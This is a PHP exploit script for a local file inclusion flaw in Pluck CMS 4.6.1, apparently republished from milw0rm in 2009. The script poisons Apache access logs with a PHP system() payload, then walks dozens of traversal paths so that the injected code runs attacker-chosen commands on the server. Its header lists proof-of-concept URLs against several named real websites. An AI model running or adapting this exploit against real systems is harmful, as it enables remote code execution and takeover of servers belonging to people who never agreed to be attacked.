<html><head><title>Pluck CMS 4.6.1 (module_pages_site.php post) LFI Exploit</title></head><pre>&lt;?php 

/*
 pluck v 4.6.1 LFI exploit
 autor : Alfons Luja
 Vuln is in \data\modules\blog\module_pages_site.php 

  ...

      $includepage = 'blog_include.php';
      //Only set 'view post'-page if a post has been specified
      if (isset($_GET['post'])) {
	//Check if post exists, and include information
	   if (file_exists('data/settings/modules/blog/posts/'.$_GET['post'])) {
		include('data/settings/modules/blog/posts/'.$_GET['post']);
		$module_page['viewpost'] = $post_title;
	   }
      }
 ...

 Nothing to comment ;x
 Greetings: For all friends and obvious for me ;D

 pr00f: 
 http://www.kilgarvangaa.com//data/modules/blog/module_pages_site.php?post=../../../../../../../../../../bin/ls
 http://www.southtrewlogcabins.co.uk/data/modules/blog/module_pages_site.php?post=../../../../../../../../../../bin/ls
 http://www.seanhood.co.uk/data/modules/blog/module_pages_site.php?post=../../../../../../../../../../bin/ls
*/  
 

if($argc &lt; 4) die(&quot;Use host path command [www.penatgon.gov /pluck ls l]\n&quot;);

set_time_limit(0);
error_reporting(0);

$host = $argv[1];
$port = $argv[2];
$path = $argv[3];
$command = $argv[4];

//add something if not w00rking ;x

$shell = array(  
         &quot;&lt;?php echo(' e[Ho_trip ');system('$command');echo(' d34th_trip'); ?&gt;&quot;,
         &quot;../apache/logs/access.log&quot;,
         &quot;../../apache/logs/access.log&quot;,
         &quot;../../../apache/logs/access.log&quot;,
         &quot;../../../../apache/logs/access.log&quot;,
         &quot;../../../../../apache/logs/access.log&quot;,
         &quot;../../../../../../apache/logs/access.log&quot;,
         &quot;../../../../../../../apache/logs/access.log&quot;,
         &quot;../../../../../../../../apache/logs/access.log&quot;,
         &quot;../../../../../../../../../apache/logs/access.log&quot;,
         &quot;../../../../../../../../../../apache/logs/access.log&quot;,
         &quot;../../../../../../../../../../../apache/logs/access.log&quot;,
         &quot;../var/log/httpd/access.log&quot;,
         &quot;../../var/log/httpd/access.log&quot;,
         &quot;../../../var/log/httpd/access.log&quot;,
         &quot;../../../../var/log/httpd/access.log&quot;,
         &quot;../../../../../var/log/httpd/access.log&quot;,
         &quot;../../../../../../var/log/httpd/access.log&quot;,
         &quot;../../../../../../../var/log/httpd/access.log&quot;,
         &quot;../../../../../../../../var/log/httpd/access.log&quot;,
         &quot;../../../../../../../../../var/log/httpd/access.log&quot;,
         &quot;../../../../../../../../../../var/log/httpd/access.log&quot;,
         &quot;../../../../../../../../../../../var/log/httpd/access.log&quot;,
         &quot;../var/log/apache/access.log&quot;,
         &quot;../../var/log/apache/access.log&quot;,
         &quot;../../../var/log/apache/access.log&quot;,
         &quot;../../../../var/log/apache/access.log&quot;,
         &quot;../../../../../var/log/apache/access.log&quot;,
         &quot;../../../../../../var/log/apache/access.log&quot;,
         &quot;../../../../../../../var/log/apache/access.log&quot;,
         &quot;../../../../../../../../var/log/apache/access.log&quot;,
         &quot;../../../../../../../../../var/log/apache/access.log&quot;,
         &quot;../../../../../../../../../../var/log/apache/access.log&quot;,
         &quot;../../../../../../../../../../../var/log/apache/access.log&quot;,
         &quot;../usr/local/apache2/logs/access.log&quot;,
         &quot;../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../../../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../../../../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../../../../../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../../../../../../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../../../../../../../../usr/local/apache2/logs/access.log&quot;,
         &quot;../../../../../../../../../../../usr/local/apache2/logs/access.log&quot;, 
   );
function _hdr($int){   //Mia³o nie byæ file_get_contents
       
        global $shell,$host,$path;
        $header .= &quot;GET /$host/$path/$shell[$int]  HTTP/1.1\r\n&quot;;
        $header .= &quot;Host: $host\r\n&quot;;
        $header .= &quot;User-Agent: _echo [ru] (Win6.66; @)\r\n&quot;;
        $header .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;
        $header .= &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;;
        $header .= &quot;Accept-Encoding: gzip,deflate\r\n&quot;;
        $header .= &quot;Connection: close\r\n\r\n&quot;;
        return $header;


}


function _inject($hosts,$ports){
    
           $hnd = fsockopen($hosts,$ports,$errno, $errstr, 30);
           if(!$hnd) die(&quot;Injection errr $errstr\n&quot;);
           fwrite($hnd,_hdr(0));
           fclose($hnd);  


}

function _result($data){
 
          $ret = explode(' e[Ho_trip ',$data); 
            if($ret[1] != &quot;&quot;){
              for($i = 1;$i&lt;count($ret);$i++){
               $ret_2 = explode(' d34th_trip',$ret[$i]);  
                   if($i - count($ret) == -1){
                     if($ret_2[0] != &quot;&quot;){
                        echo($ret_2[0]);
                     } else {
                        die(&quot;Exploit failed!!\n&quot;);
                     }
               } 
              }    
               
            }

}

function _exploit($hosts,$paths){

        global $shell;
        $rets = &quot;&quot;;
        $count = count($shell);

        for($i=1;$i&lt;$count;$i++){
            
            $tab = file_get_contents(&quot;http://&quot;.$hosts.&quot;/&quot;.$paths.&quot;/data/modules/blog/module_pages_site.php?post=$shell[$i]&quot;);
           _result($tab);
  
        }
 
         
}
echo(&quot;---- pluck v 4.6.1 -----\n\n&quot;.
     &quot;Autor: Alfons Luja\n&quot;.
     &quot;Target: $host\n&quot;.
     &quot;Path: $path\n&quot;.
     &quot;Port: $port\n&quot;.
     &quot;COM: $command\n&quot;.
     &quot;Ex: poc.php www.target.com 80 pluck \&quot;dir\&quot;\n\n&quot;);

    _inject($host,$port);
    _exploit($host,$path);

?&gt;

# milw0rm.com [2009-03-23]</pre></html>